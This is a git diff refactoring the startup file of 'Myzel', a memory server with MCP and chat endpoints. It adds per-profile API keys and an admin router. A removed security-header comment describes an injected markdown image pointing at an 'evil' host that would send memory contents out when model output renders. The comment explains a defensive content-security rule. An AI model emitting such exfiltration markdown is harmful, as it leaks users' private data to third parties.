@@ -1,48 +1,98 @@
 import path from "node:path";
-import { existsSync } from "node:fs";
 import { fileURLToPath } from "node:url";
-import express from "express";
-import cors from "cors";
 import { KnowledgeBase, parseDuration } from "@myzel/core";
-import { mcpRouter } from "./mcp/http.js";
-import { browseRouter } from "./api/browse.js";
-import { chatRouter } from "./api/chat.js";
-import { bearerAuth } from "./auth.js";
-import { corsDelegate, isLoopbackHost, netGuard, parseList } from "./net-guard.js";
-import { parseTrustProxy, rateLimit } from "./rate-limit.js";
+import { buildApp } from "./app.js";
+import { adminRouter } from "./admin.js";
+import { profileMemoryHost, singleMemoryHost, type MemoryHost } from "./host.js";
+import { isLoopbackHost, parseList } from "./net-guard.js";
+import { parseTrustProxy } from "./rate-limit.js";
 import { envCount } from "./env.js";
-import { LIMITS } from "./limits.js";
-import { checkGitAutocommit, checkModelConfig } from "./startup.js";
+import { ProfileRegistry } from "./profiles.js";
+import { checkModelConfig, requireGitReady } from "./startup.js";
 import { startDreamer } from "./dreamer.js";
 
-const bundleRoot = process.env.BUNDLE_ROOT;
-if (!bundleRoot) {
-  console.error("BUNDLE_ROOT env var is required");
-  process.exit(1);
-}
-
-const kb = new KnowledgeBase(bundleRoot, {
-  gitAutocommit: process.env.GIT_AUTOCOMMIT === "true",
-});
-await checkGitAutocommit(kb, (line) => console.log(line));
-
-/** Failed authentication attempts per client before it is locked out for the window. */
-const AUTH_FAILURE_LIMIT = 20;
-const AUTH_FAILURE_WINDOW_MS = 15 * 60_000;
 /** Below Docker's 10s grace period between SIGTERM and SIGKILL. */
 const SHUTDOWN_DEADLINE_MS = 8_000;
 
-const stopDreamer = startDreamer(kb);
+// PROFILES_ROOT takes precedence: the Docker image always sets BUNDLE_ROOT.
+const bundleRoot = process.env.BUNDLE_ROOT;
+const profilesRoot = process.env.PROFILES_ROOT;
+if (!profilesRoot && !bundleRoot) {
+  console.error("BUNDLE_ROOT (one memory) or PROFILES_ROOT (one memory per profile) is required");
+  process.exit(1);
+}
+const gitAutocommit = process.env.GIT_AUTOCOMMIT === "true";
 
-const app = express();
-app.disable("x-powered-by");
+checkModelConfig((line) => console.log(line));
+
+// Choose how requests find their memory: one bundle, or one per profile key.
+let memoryHost: MemoryHost;
+let admin: ReturnType<typeof adminRouter> | undefined;
+let serving: string;
+let authEnabled: boolean;
+try {
+  if (profilesRoot) {
+    const registry = new ProfileRegistry(profilesRoot, { gitAutocommit });
+    const existing = await registry.memories();
+    if (gitAutocommit) {
+      for (const { name, kb } of existing) await requireGitReady(kb, `profile "${name}"`);
+    }
+    memoryHost = profileMemoryHost(registry);
+    serving = `${existing.length} profile(s) from ${registry.root}`;
+    authEnabled = true;
+    console.log("[myzel] auth: a profile API key is required for /mcp and /api");
+    if (process.env.AUTH_TOKEN) {
+      console.warn("[myzel] AUTH_TOKEN is ignored in profile mode — each profile has its own key");
+    }
+    const adminToken = process.env.ADMIN_TOKEN;
+    if (adminToken) {
+      admin = adminRouter(registry, adminToken, async (name) => {
+        if (!gitAutocommit) return;
+        const created = (await registry.memories()).find((m) => m.name === name);
+        if (created) await requireGitReady(created.kb, `profile "${name}"`);
+      });
+      console.log("[myzel] admin: profile management enabled at /admin (ADMIN_TOKEN)");
+    } else {
+      console.log("[myzel] admin: /admin disabled (set ADMIN_TOKEN, or use the profiles CLI)");
+    }
+  } else {
+    const kb = new KnowledgeBase(bundleRoot!, { gitAutocommit });
+    if (gitAutocommit) await requireGitReady(kb, "the bundle");
+    const authToken = process.env.AUTH_TOKEN;
+    memoryHost = singleMemoryHost(kb, authToken);
+    serving = `bundle ${bundleRoot}`;
+    authEnabled = Boolean(authToken);
+    console.log(
+      authToken
+        ? "[myzel] auth: bearer token required for /mcp and /api"
+        : "[myzel] auth: disabled (set AUTH_TOKEN to protect /mcp and /api)"
+    );
+  }
+} catch (err) {
+  console.error(`[myzel] ${(err as Error).message}`);
+  process.exit(1);
+}
+if (gitAutocommit) console.log("[myzel] git autocommit: enabled");
+
+const stopDreamer = startDreamer(async () =>
+  (await memoryHost.memories()).map(({ kb, profile }) => ({ kb, label: profile }))
+);
+
+// Bind to loopback unless a public interface is explicitly requested. The
+// memory is personal data and auth is optional, so "reachable from the LAN"
+// must be a decision, not a default.
+const host = process.env.HOST ?? "127.0.0.1";
+const guard = {
+  allowedOrigins: parseList(process.env.ALLOWED_ORIGINS),
+  allowedHosts: parseList(process.env.ALLOWED_HOSTS),
+  hostPolicy: isLoopbackHost(host) ? ("loopback" as const) : ("public" as const),
+};
 
 // Behind a reverse proxy every request arrives from the proxy's address; the
-// rate limiter would then put all clients in one bucket. TRUST_PROXY names
-// the proxy so req.ip becomes the real client.
+// rate limiter would then put all clients in one bucket. TRUST_PROXY names the
+// proxy so req.ip becomes the real client.
 const trustProxy = parseTrustProxy(process.env.TRUST_PROXY);
 if (trustProxy !== undefined) {
-  app.set("trust proxy", trustProxy);
   console.log(`[myzel] trust proxy: ${String(trustProxy)}`);
   if (trustProxy === true) {
     console.warn(
@@ -52,155 +102,53 @@ if (trustProxy !== undefined) {
   }
 }
 
-// Baseline headers for the UI and API. Shiki's highlighted code carries inline
-// `style` attributes, hence 'unsafe-inline' for styles only; scripts stay
-// same-origin. frame-ancestors keeps the UI out of other sites' iframes.
-// Images only from here: model output is rendered as markdown, and an
-// injected ![](https://evil/?data=…) would otherwise send memory contents to a
-// third party the moment it renders, without a click.
-app.use((_req, res, next) => {
-  res.setHeader(
-    "Content-Security-Policy",
-    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
-      "img-src 'self' data:; connect-src 'self'; object-src 'none'; " +
-      "base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
-  );
-  res.setHeader("X-Content-Type-Options", "nosniff");
-  res.setHeader("Referrer-Policy", "no-referrer");
-  next();
-});
-
-checkModelConfig((line) => console.log(line));
-
-// Bind to loopback unless a public interface is explicitly requested. The
-// memory is personal data and auth is optional, so "reachable from the LAN"
-// must be a decision, not a default.
-const host = process.env.HOST ?? "127.0.0.1";
-const authToken = process.env.AUTH_TOKEN;
-
-const guardConfig = {
-  allowedOrigins: parseList(process.env.ALLOWED_ORIGINS),
-  allowedHosts: parseList(process.env.ALLOWED_HOSTS),
-  hostPolicy: isLoopbackHost(host) ? ("loopback" as const) : ("public" as const),
-};
-
-// Liveness for container health checks. Outside /api and /mcp on purpose: it
-// needs no token, touches no memory, and reveals nothing but "up".
-app.get("/healthz", (_req, res) => {
-  res.json({ status: "ok" });
-});
-
-// Same-origin plus an explicit allowlist — never a blanket reflection of the
-// request origin, which would let any page in the user's browser read the
-// memory off an unauthenticated instance.
-app.use(cors(corsDelegate(guardConfig)));
-app.use(express.json({ limit: LIMITS.jsonBody }));
-
-// Origin/Host validation for the two routers that touch the memory. Runs
-// before auth so a hostile origin is refused whether or not a token is set.
-app.use(["/mcp", "/api"], netGuard(guardConfig));
-
-// Optional bearer auth: protects the memory (/mcp + /api) when AUTH_TOKEN is
-// set. The static web UI stays open and prompts for the token.
-if (authToken) {
-  // bearerAuth refuses a client after AUTH_FAILURE_LIMIT failed attempts per
-  // window, before the token is even compared.
-  app.use(
-    ["/mcp", "/api"],
-    bearerAuth(authToken, { limit: AUTH_FAILURE_LIMIT, windowMs: AUTH_FAILURE_WINDOW_MS })
-  );
-  console.log("[myzel] auth: bearer token required for /mcp and /api");
-} else {
-  console.log("[myzel] auth: disabled (set AUTH_TOKEN to protect /mcp and /api)");
-}
-
-// Both routers below can start an agent run, which costs tokens — brake them.
 // A blank or malformed RATE_LIMIT must not silently disable the brake — only
 // an explicit 0 does that (envCount).
-const rateLimitOptions = {
+const rateLimit = {
   limit: envCount(process.env.RATE_LIMIT, 60),
   windowMs: parseDuration(process.env.RATE_LIMIT_WINDOW) ?? 60_000,
 };
-if (rateLimitOptions.limit > 0) {
-  app.use(
-    ["/mcp", "/api/chat"],
-    rateLimit({ ...rateLimitOptions, hint: "Raise RATE_LIMIT, or set it to 0 to disable." })
-  );
-  console.log(
-    `[myzel] rate limit: ${rateLimitOptions.limit} requests / ${Math.round(rateLimitOptions.windowMs / 1000)}s per client on /mcp and /api/chat`
-  );
-} else {
-  console.log("[myzel] rate limit: disabled (RATE_LIMIT=0)");
-}
-
-// The browse API never calls a model, but each request reads the whole bundle;
-// a looser brake keeps a scripted client from pinning the disk. /api/chat has
-// its own (stricter) limit above and is not counted twice.
-const browseLimit = envCount(process.env.RATE_LIMIT_BROWSE, 600);
-if (browseLimit > 0) {
-  const browseLimiter = rateLimit({
-    limit: browseLimit,
-    windowMs: rateLimitOptions.windowMs,
-    hint: "Raise RATE_LIMIT_BROWSE, or set it to 0 to disable.",
-  });
-  app.use("/api", (req, res, next) =>
-    req.path === "/chat" ? next() : browseLimiter(req, res, next)
-  );
-}
-
-app.use("/mcp", mcpRouter(kb));
-app.use("/api", browseRouter(kb));
-app.use("/api", chatRouter(kb));
-
-// Serve the built web UI in production (single container).
-const webDist = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../web/dist");
-if (existsSync(webDist)) {
-  // index.html at "/" and the built assets — nothing else. The UI has no
-  // client-side routes, and its asset URLs are relative (to work under a proxy
-  // path prefix), so serving index.html at other paths would only produce a
-  // blank page whose assets resolve under that path. Unknown paths are 404s.
-  app.use(express.static(webDist));
-}
-
-// Last resort: log the error, but never send a stack trace (absolute paths,
-// library internals) to the client.
-app.use(
-  (err: unknown, _req: express.Request, res: express.Response, next: express.NextFunction) => {
-    if (res.headersSent) return next(err);
-    console.error("[myzel] unhandled request error:", err);
-    const status = (err as { status?: unknown }).status;
-    res
-      .status(typeof status === "number" && status >= 400 && status < 600 ? status : 500)
-      .json({ error: "internal error" });
-  }
+console.log(
+  rateLimit.limit > 0
+    ? `[myzel] rate limit: ${rateLimit.limit} requests / ${Math.round(rateLimit.windowMs / 1000)}s per client on /mcp and /api/chat`
+    : "[myzel] rate limit: disabled (RATE_LIMIT=0)"
 );
+
+const { app } = buildApp(memoryHost, {
+  guard,
+  trustProxy,
+  rateLimit,
+  browseLimit: envCount(process.env.RATE_LIMIT_BROWSE, 600),
+  webDist: path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../web/dist"),
+  admin,
+});
 
 const port = envCount(process.env.PORT, 3800);
 const server = app.listen(port, host, () => {
   console.log(
     `[myzel] origin guard: same-origin` +
-      (guardConfig.allowedOrigins.length ? ` + ${guardConfig.allowedOrigins.join(", ")}` : "") +
+      (guard.allowedOrigins.length ? ` + ${guard.allowedOrigins.join(", ")}` : "") +
       `; Host header restricted to ${
-        guardConfig.hostPolicy === "loopback" ? "loopback" : "loopback names and IP addresses"
+        guard.hostPolicy === "loopback" ? "loopback" : "loopback names and IP addresses"
       }` +
-      (guardConfig.allowedHosts.length ? ` + ${guardConfig.allowedHosts.join(", ")}` : "")
+      (guard.allowedHosts.length ? ` + ${guard.allowedHosts.join(", ")}` : "")
   );
-  if (!isLoopbackHost(host) && !authToken) {
+  if (!isLoopbackHost(host) && !authEnabled) {
     console.warn(
       "[myzel] WARNING: bound to a non-loopback interface with AUTH_TOKEN unset — " +
         "anyone who can reach this port can read and rewrite the memory. Set AUTH_TOKEN."
     );
   }
-  console.log(`Myzel serving bundle ${bundleRoot} on ${host}:${port} (web + /api + /mcp)`);
+  console.log(`Myzel serving ${serving} on ${host}:${port} (web + /api + /mcp)`);
 });
 
 /**
  * Graceful shutdown: `docker stop` sends SIGTERM, then SIGKILL after 10s. Stop
  * accepting requests, let running requests finish (an agent run may still be
- * writing), then let the mutation queue drain, so a concept is never left
- * written without its index.md, log.md entry or commit. A run that outlasts the
- * deadline is cut off: every file it wrote is complete (writes are atomic),
- * but its last mutation may lack the index, log entry or commit that follows.
+ * writing), then let every memory's mutation queue drain, so a concept is never
+ * left written without its index.md, log.md entry or commit. A run that
+ * outlasts the deadline is cut off: every file it wrote is complete (writes are
+ * atomic), but its last mutation may lack the index, log entry or commit.
  */
 let shuttingDown = false;
 const shutdown = (signal: string) => {
@@ -216,7 +164,7 @@ const shutdown = (signal: string) => {
   }, SHUTDOWN_DEADLINE_MS);
   deadline.unref();
   requestsDone
-    .then(() => kb.idle())
+    .then(() => memoryHost.drain())
     .then(
       () => process.exit(0),
       () => process.exit(1)
